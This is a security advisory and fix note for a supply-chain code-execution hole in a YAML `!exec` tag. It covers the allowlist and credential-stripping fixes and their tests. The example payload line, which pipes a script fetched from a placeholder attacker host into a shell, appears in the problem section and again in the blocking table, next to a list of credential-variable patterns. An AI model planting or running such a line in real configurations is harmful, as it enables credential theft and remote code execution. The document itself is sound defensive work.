# Fix: !exec YAML Function Enables Arbitrary Command Execution (CWE-78 / CWE-94)

**Date:** 2026-04-01
**Severity:** Critical (supply-chain RCE)
**CWE:** CWE-78 (OS Command Injection), CWE-94 (Code Injection via Configuration)

---

## Problem

The `!exec` YAML tag function executed arbitrary shell commands specified in stack
configuration files, with the full process environment available to the child shell.

A malicious component author could publish a Terraform module to a public git repository
containing a stack or component YAML file with a payload such as:

```yaml
some_var: !exec "curl http://attacker.com/c2.sh | sh"
```

When a developer runs `atmos vendor pull` to ingest the module and then executes any
`atmos` command that processes stack configuration (e.g. `atmos terraform plan`), the
`!exec` tag is evaluated and the curl+pipe command runs with the developer's full shell
environment — including cloud credentials (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, etc.)
— enabling remote code execution and credential exfiltration in local and CI/CD contexts.

### Root Cause

`ProcessTagExec` in `pkg/utils/yaml_func_exec.go` passed the tag value verbatim to
`ExecuteShellAndReturnOutput`, which invoked the full `mvdan.cc/sh/v3` shell interpreter
with `os.Environ()` as the environment. No restriction existed on which commands could
be run or which environment variables were visible to the subprocess.

### Attack Vector

```
atmos vendor pull (ingests malicious component)
  → stack file loaded with !exec "curl ... | sh"
    → ProcessTagExec called without any allowlist check
      → ExecuteShellAndReturnOutput(cmd, ..., os.Environ(), ...)
        → sh interpreter runs curl+pipe with AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, etc.
```

---

## Fix

Two independent mitigations were applied.

### Mitigation 1 — exec.allowed_commands allowlist

A new top-level `exec` configuration section is recognised in `atmos.yaml`:

```yaml
exec:
  allowed_commands:
    - jq
    - my-approved-tool
```

When `exec.allowed_commands` is non-empty, `ProcessTagExec` uses the `mvdan.cc/sh/v3`
AST parser to enumerate every command binary name in the shell expression (including
those nested in pipes, subshells, and command substitutions) before executing anything.
If any name is absent from the allowlist, the function returns an error and execution is
aborted.

Dynamic command references — variable expansions (`$CMD`) or command substitutions used
as the command itself (`$(get_cmd) arg`) — are also rejected when an allowlist is active,
since they cannot be statically verified.

**Default behaviour is unchanged:** an absent or empty `allowed_commands` list imposes
no restriction, preserving backward compatibility.

#### Configuration schema

```yaml
# atmos.yaml
exec:
  allowed_commands:      # []string — if empty or omitted, all commands are allowed
    - jq
    - yq
    - my-approved-binary
```

#### Blocking examples

| Expression | Outcome when allowlist = `[jq]` |
|---|---|
| `!exec "jq . file.json"` | ✅ Allowed |
| `!exec "jq . file.json \| sh"` | ❌ Blocked — `sh` not in allowlist |
| `!exec "curl http://attacker.com/c2.sh \| sh"` | ❌ Blocked — both `curl` and `sh` absent |
| `!exec "$HIDDEN_CMD"` | ❌ Blocked — dynamic command name |
| `!exec "$(get_cmd) arg"` | ❌ Blocked — dynamic command name |

### Mitigation 2 — credential-bearing environment variable sanitization

Regardless of allowlist configuration, `ProcessTagExec` now calls `sanitizeEnv()` to
strip credential-bearing variables from the environment passed to the shell subprocess.
This limits the damage if an attacker can execute a whitelisted binary in an unexpected
way.

The following patterns are stripped:

| Pattern | Examples |
|---|---|
| Prefix `AWS_SECRET_` | `AWS_SECRET_ACCESS_KEY` |
| Suffix `_TOKEN` | `GITHUB_TOKEN`, `GITLAB_TOKEN`, `VAULT_TOKEN`, `AWS_SESSION_TOKEN` |
| Suffix `_SECRET` | `DEPLOY_SECRET`, `MY_SECRET` |
| Suffix `_PASSWORD` | `DB_PASSWORD`, `MY_APP_PASSWORD` |
| Suffix `_PASSWD` | `DB_PASSWD` |
| Suffix `_API_KEY` | `SERVICE_API_KEY`, `MY_API_KEY` |
| Suffix `_PRIVATE_KEY` | `TLS_PRIVATE_KEY`, `SSH_PRIVATE_KEY` |

---

## Scope of Changes

### Stack/component path (primary attack surface)

`internal/exec/yaml_func_utils.go` — `processSimpleTags` passes the full
`*schema.AtmosConfiguration` to `ProcessTagExec`, so `exec.allowed_commands` is enforced
for all `!exec` tags encountered while processing stack files.

### atmos.yaml config-load path (trusted, operator-controlled)

`pkg/config/process_yaml.go` — `processExecTag` and `handleExec` pass `nil` for config.
atmos.yaml is written by the operator (not vendored from third-party sources), so the
allowlist is not applied here. Credential sanitization still applies.

---

## Files Changed

| File | Change |
|------|--------|
| `pkg/schema/schema.go` | Added `ExecConfig` struct; added `Exec ExecConfig` field to `AtmosConfiguration` |
| `pkg/utils/yaml_func_exec.go` | `ProcessTagExec` now accepts `*schema.AtmosConfiguration`; added allowlist check and `sanitizeEnv` |
| `pkg/utils/shell_utils.go` | Added `extractCommandNamesFromShell` AST walker |
| `pkg/config/process_yaml.go` | Updated call sites to pass `nil` config |
| `internal/exec/yaml_func_utils.go` | Updated call site to pass `atmosConfig` |
| `pkg/utils/yaml_func_exec_test.go` | New tests for allowlist enforcement, pipe blocking, dynamic-command blocking, env sanitization, and AST walker edge cases |

---

## Testing

New tests in `pkg/utils/yaml_func_exec_test.go`:

| Test | What it verifies |
|------|------------------|
| `TestProcessTagExec_AllowedCommands_Allowed` | Allowlisted command executes successfully |
| `TestProcessTagExec_AllowedCommands_Blocked` | Non-allowlisted command is rejected |
| `TestProcessTagExec_AllowedCommands_BlockedPipe` | Pipe containing a non-allowlisted command is rejected |
| `TestProcessTagExec_AllowedCommands_Empty` | Empty allowlist imposes no restriction (backward compat) |
| `TestProcessTagExec_AllowedCommands_DynamicCommandBlocked` | Dynamic `$VAR` command rejected when allowlist is active |
| `TestExtractCommandNamesFromShell` | AST walker: single cmd, pipe, variable expansion, command substitution, invalid syntax |
| `TestIsSensitiveEnvVar` | Every prefix/suffix pattern matched with documented examples |
| `TestSanitizeEnv` | Safe vars preserved; sensitive vars removed |
